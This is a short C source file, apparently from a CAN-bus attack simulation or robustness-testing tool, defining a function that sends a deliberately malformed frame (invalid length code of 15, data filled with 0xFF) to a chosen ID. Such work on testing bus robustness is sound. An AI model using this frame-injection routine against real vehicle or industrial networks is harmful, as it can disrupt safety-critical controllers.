#include <stdio.h>
#include <string.h>
#include <stdint.h>

#include "bus.h"
#include "can_types.h"

void attack_send_malformed(uint32_t id)
{
    can_frame_t frame;

    frame.id  = id;
    frame.dlc = 15; // intentionally invalid DLC for classic CAN

    memset(frame.data, 0xFF, sizeof(frame.data));

    printf("[ATTACK_MALFORMED] Sending malformed frame to ID 0x%03X (dlc=%u)\n",
           frame.id, frame.dlc);

    bus_send_frame(&frame);
}
